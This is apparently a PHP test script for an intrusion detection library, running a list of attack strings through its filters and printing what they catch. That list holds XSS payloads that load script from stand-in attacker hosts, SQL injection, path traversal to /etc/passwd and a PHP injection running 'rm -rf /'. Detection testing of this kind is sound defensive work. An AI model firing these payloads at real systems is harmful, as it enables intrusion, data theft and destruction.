<?php
require_once("../Lib/IDSMonitor.class.php");

$maliciousData=array(
	'test1' 	=> 'admin<script/src=http/attacker.com>',
	'test2'		=> '9<script/src=http/attacker.com>',
	'test3'		=> '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="',
	'test4' 	=> '\'\'"--><script>eval(String.fromCharCode(88,83,83)));%00', '"></a style="xss:ex/**/pression(alert(1));"',
	'test5' 	=> '" OR 1=1#', '; DROP table Users --',
	'test6' 	=> '../../etc/passwd',
	'test7' 	=> '\%windir%\cmd.exe',
	'test8' 	=> ';phpinfo()',
	'test9' 	=> '"; <?php exec("rm -rf /"); ?>',
	'test10'	=> 'XXX',
	'test11'	=>  '60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62',
	'test12'	=> '\74\163\143\162\151\160\164\76\141\154\145\162\164\50\47\150\151\47\51\74\57\163\143\162\151\160\164\76',
	'test13'	=>  '\x0000003c\x0000073\x0000063\x0000072\x0000069\x0000070\x0000074\x000003e\x0000061\x000006c\x0000065\x0000072\x0000074\x0000028\x0000032\x0000029\x000003c\x000002f\x0000073\x0000063\x0000072\x0000069\x0000070\x0000074\x000003e'
);

$storage=&new IDSXmlStorageProvider("../Lib/filters.utf8.xml");
$monitor=&new IDSMonitor($maliciousData, $storage);
$report=&$monitor->Run();

echo "<pre>";
print_r($report);
echo "</pre>";
?>